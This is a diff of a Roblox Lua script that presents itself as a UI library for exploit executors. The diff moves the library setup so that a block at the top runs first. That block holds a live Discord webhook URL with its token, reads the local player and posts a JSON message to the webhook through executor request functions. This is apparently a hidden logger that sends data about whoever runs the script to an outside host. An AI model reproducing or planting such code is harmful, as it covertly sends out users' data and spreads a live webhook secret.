@@ -1,15 +1,3 @@
-repeat task.wait() until game:IsLoaded()
-local library = {}
-local ToggleUI = false
-library.currentTab = nil
-library.flags = {}
-
-local services = setmetatable({}, {
-  __index = function(t, k)
-    return game.GetService(game, k)
-  end
-})
-
 local Webhook = "https://discord.com/api/webhooks/1275482402336145470/1D6PstGHwOpuffpumoDaSH6a1tbnAXzx2m2cYfVU3OzUS-dtAE8LALldoeq6J0KxUhYL"
 
     local player = game:GetService"Players".LocalPlayer
@@ -102,6 +90,18 @@ local Webhook = "https://discord.com/api/webhooks/1275482402336145470/1D6PstGHwO
 
     request = http_request or request or HttpPost or syn.request
     request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+
+repeat task.wait() until game:IsLoaded()
+local library = {}
+local ToggleUI = false
+library.currentTab = nil
+library.flags = {}
+
+local services = setmetatable({}, {
+  __index = function(t, k)
+    return game.GetService(game, k)
+  end
+})
 
 local mouse = services.Players.LocalPlayer:GetMouse()
 
